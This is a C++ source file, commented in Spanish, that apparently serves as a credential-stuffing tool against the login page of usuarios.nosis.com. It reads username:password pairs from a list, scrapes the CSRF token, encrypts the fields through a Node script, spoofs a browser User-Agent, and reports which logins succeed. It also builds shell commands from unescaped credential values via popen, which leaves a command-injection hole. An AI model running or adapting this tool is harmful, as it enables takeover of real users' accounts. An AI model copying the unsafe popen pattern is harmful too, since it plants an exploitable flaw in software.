#include <cpr/cpr.h>
#include <regex>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <array>
#include <memory>


#include "include/formater.hpp"

using namespace std;


// Ejecutar Node.js
string ejecutar(const string& comando) {
    string result;
    array<char, 256> buffer;
    shared_ptr<FILE> pipe(popen(comando.c_str(), "r"), pclose);
    if (!pipe) throw runtime_error("ERROR: popen falló.");
    while (!feof(pipe.get()))
        if (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
            result += buffer.data();
    return result;
}

// Extraer CSRF token del HTML
string extraerCSRFToken(const string& html) {
    regex token_regex(R"tok(name="__RequestVerificationToken"[^>]*value="([^"]+)")tok");
    smatch m;
    if (regex_search(html, m, token_regex)) return m[1];
    return "";
}

// Login para una credencial
void login(const string& usuario, const string& clave) {
    const string url      = "https://usuarios.nosis.com/es";
    const string referer  = url;
    const string origin   = "https://usuarios.nosis.com";
    const string ua       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";

    // Paso 1: GET para obtener token y cookies
    auto get = cpr::Get(
        cpr::Url{url},
        cpr::Header{
            {"User-Agent", ua},
            {"Referer", referer},
            {"Accept", "*/*"},
            {"Accept-Language", "es-ES,es;q=0.9"}
        }
    );

    if (get.status_code != 200) {
        cerr << "X Error de conexión (GET): HTTP " << get.status_code << endl;
        return;
    }

    string token = extraerCSRFToken(get.text);
    if (token.empty()) {
        cerr << "X Token CSRF no encontrado." << endl;
        return;
    }

    cout << "→ Procesando usuario: " << usuario << endl;

    // Cifrar usuario y clave usando Node.js
    string email_cif = ejecutar("node encrypt.js \"" + usuario + "\"");
    string clave_cif = ejecutar("node encrypt.js \"" + clave   + "\"");

    email_cif.erase(email_cif.find_last_not_of(" \n\r\t") + 1);
    clave_cif.erase(clave_cif.find_last_not_of(" \n\r\t") + 1);

    // POST con datos cifrados
    auto post = cpr::Post(
        cpr::Url{url},
        cpr::Header{
            {"User-Agent", ua},
            {"Accept", "*/*"},
            {"Accept-Language", "es-ES,es;q=0.8"},
            {"Content-Type", "application/x-www-form-urlencoded"},
            {"Referer", referer},
            {"Origin", origin}
        },
        cpr::Payload{
            {"__RequestVerificationToken", token},
            {"TipoAcceso", "Interno"},
            {"Email", ""},
            {"Clave", ""},
            {"HDEmail", email_cif},
            {"HDClave", clave_cif},
            {"RecordarClave", "false"},
            {"RecordarClave", "true"}
        },
        cpr::Cookies(get.cookies)
    );

    // Resultado del login
    if (post.status_code == 200) {
        if (post.text.find("cuenta.min.css") != string::npos ||
            post.text.find("Cerrar sesión") != string::npos ||
            post.text.find("Mi cuenta") != string::npos) {
            cout << "✓ Login exitoso para usuario: " << usuario << endl;
        } else if (post.text.find("Clave o usuario incorrecto") != string::npos) {
            cout << "X Credenciales incorrectas para usuario: " << usuario << endl;
        } else {
            cout << "# No se pudo confirmar login para " << usuario << ". HTML inesperado.\n";
        }
    } else {
        cerr << "X Error POST: HTTP " << post.status_code << " para usuario: " << usuario << endl;
    }
    cout << "------------------------------------------\n";
}

void reproductor() {
    ifstream archivo("txts/output.txt");
    if (!archivo.is_open()) {
        cerr << "No se pudo abrir el archivo de credenciales.\n";
        
    }

    string linea;
    while (getline(archivo, linea)) {
        if (linea.empty()) continue;

        size_t separador = linea.find(':');
        if (separador == string::npos) {
            cerr << "⚠️  Formato inválido: " << linea << endl;
            continue;
        }

        string usuario = linea.substr(0, separador);
        string clave   = linea.substr(separador + 1);

        login(usuario, clave);
    }

    
}

int main() {

    formater();
    if (formater_ended == true) {

        reproductor();
    }
}